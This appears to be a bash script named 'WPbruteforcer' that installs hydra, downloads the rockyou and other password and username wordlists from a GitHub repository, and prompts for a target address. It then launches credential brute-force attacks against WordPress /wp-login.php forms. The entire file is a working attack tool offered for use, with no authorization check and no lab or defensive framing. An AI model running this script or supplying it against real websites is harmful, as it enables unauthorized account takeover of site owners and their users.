#!/bin/bash
#
# Author: Joseph Hurley
# Purpose: Password & Username brute-forcing on Wordpress

# ANSI escape Codes (for colored output, -e required on echo)
readonly RED='\033[0;31m'   # Rred
readonly GREEN='\u001b[32m' # Green
readonly NC='\033[0m'       # Neutral (White)

# variables for wordlists
readonly ROCKYOU="$HOME""/wpbruteforcer/wordlists/rockyou.txt"
readonly ONEMILPWLIST="$HOME""/wpbruteforcer/wordlists/1milpwlist.txt"
readonly USERNAMELIST="$HOME""/wpbruteforcer/wordlists/usernames.txt"

echo '___       __   ________  ________  ________  ___  ___  _________  ________ ________  ________  ________  _______   ________'
echo '|\  \     |\  \|\   __  \|\   __  \|\   __  \|\  \|\  \|\___   ___\\  _____\\   __  \|\   __  \|\   ____\|\  ___ \ |\   __  \'
echo '\ \  \    \ \  \ \  \|\  \ \  \|\ /\ \  \|\  \ \  \\\  \|___ \  \_\ \  \__/\ \  \|\  \ \  \|\  \ \  \___|\ \   __/|\ \  \|\  \'
echo ' \ \  \  __\ \  \ \   ____\ \   __  \ \   _  _\ \  \\\  \   \ \  \ \ \   __\\ \  \\\  \ \   _  _\ \  \    \ \  \_|/_\ \   _  _\'
echo '  \ \  \|\__\_\  \ \  \___|\ \  \|\  \ \  \\  \\ \  \\\  \   \ \  \ \ \  \_| \ \  \\\  \ \  \\  \\ \  \____\ \  \_|\ \ \  \\  \|'
echo '   \ \____________\ \__\    \ \_______\ \__\\ _\\ \_______\   \ \__\ \ \__\   \ \_______\ \__\\ _\\ \_______\ \_______\ \__\\ _\ '
echo '    \|____________|\|__|     \|_______|\|__|\|__|\|_______|    \|__|  \|__|    \|_______|\|__|\|__|\|_______|\|_______|\|__|\|__|'                                                                                                                       
echo ''
echo ' ________      ___    ___      ________  _______   ________  ___  ___  ___       _______       ___    ___'
echo '|\   __  \    |\  \  /  /|    |\   ____\|\  ___ \ |\   __  \|\  \|\  \|\  \     |\  ___ \     |\  \  /  /|'
echo '\ \  \|\ /_   \ \  \/  / /    \ \  \___|\ \   __/|\ \  \|\  \ \  \\\  \ \  \    \ \   __/|    \ \  \/  / /'
echo ' \ \   __  \   \ \    / /      \ \_____  \ \  \_|/_\ \   ____\ \   __  \ \  \    \ \  \_|/__   \ \    / /'
echo '  \ \  \|\  \   \/  /  /        \|____|\  \ \  \_|\ \ \  \___|\ \  \ \  \ \  \____\ \  \_|\ \   \/  /  /'
echo '   \ \_______\__/  / /            ____\_\  \ \_______\ \__\    \ \__\ \__\ \_______\ \_______\__/  / /'  
echo '    \|_______|\___/ /            |\_________\|_______|\|__|     \|__|\|__|\|_______|\|_______|\___/ /'     
echo '             \|___|/             \|_________|                                                \|___|/'      

getdependencies () {
# install required packages
echo -e "$GREEN""\ndownloading required packages...""$NC"
sudo apt install hydra

# create directories and files
mkdir ~/wpbruteforcer
mkdir ~/wpbruteforcer/wordlists

# download wordlists
echo -e "$GREEN""downloading wordlists...""$NC"
wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/rockyou.txt.gz -O ~/wpbruteforcer/wordlists/rockyou.txt.gz
wget -q https://github.com/Sephley/WPbruteforcer/raw/main/wordlists/1milpwlist.txt -O ~/wpbruteforcer/wordlists/1milpwlist.txt
wget -q https://raw.githubusercontent.com/Sephley/WPbruteforcer/main/wordlists/usernames.txt -O ~/wpbruteforcer/wordlists/usernames.txt

# de-compress rockyou.txt
echo -e "$GREEN""de-compressing wordlists...""$NC"
gzip -d ~/wpbruteforcer/wordlists/rockyou.txt.gz
rm ~/wpbruteforcer/wordlists/rockyou.txt.gz
}

# brute-force using both a username & a password wordlist
hydrausernamewordlist () {
if [ "$REPLY" == 1 ]; then 
    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
    hydra -L "$USERNAMELIST" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard' # last string specifies error message, cookie and destination (S=dashboard is destination)
else
    echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
    hydra -L "$USERNAMELIST" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
    exit 0
fi
}

# brute-force using specified username & a password wordlist
hydraspecificusername () {
    if [ "$REPLY" == 1 ]; then 
    echo -e "$GREEN""you picked the following wordlist: rockyou.txt""$NC"
    hydra -l "$USERNAME" -P "$ROCKYOU" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
else 
    echo -e "$GREEN""you picked the following wordlist: 1milpwlist.txt""$NC"
    hydra -l "$USERNAME" -P "$ONEMILPWLIST" "$NETWORKADDRESS" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=dashboard'
    exit 0
fi
}

# prompt user to enter IP-Address or FQDN
getnetworkaddress () {
echo -e "$GREEN""type your destined IP-Address or FQDN: ""$NC"
read -r NETWORKADDRESS
}

# Select one of two password wordlists to use
getpwwordlist () {
    echo -e "$GREEN""select the password wordlist you would like to use\n""$NC"
    select d in rockyou.txt 1milpwlist.txt; 
    do test -n "$d" && break; # sends error message if answer is invalid
    echo -e "$RED>>> Invalid Selection""$NC"; done
}

# ask if use would like to specify a wordlist, or use a username wordlist
getusernamewordlist () {
echo -e "$GREEN""would you like to use a username wordlist, or would you like to try a specific one?\n""$NC"
select w in 'I want to use a wordlist' 'I want to try a specific username'; 
do test -n "$w" && break; 
echo -e "$RED>>> Invalid Selection""$NC"; done

}

# all functions
getdependencies
getusernamewordlist
if [ "$REPLY" == 2 ]; then
    echo -e "$GREEN""enter username: ""$NC"
    read -r USERNAME
    getpwwordlist
    getnetworkaddress
    hydraspecificusername
else
    getpwwordlist
    getnetworkaddress
    hydrausernamewordlist
fi
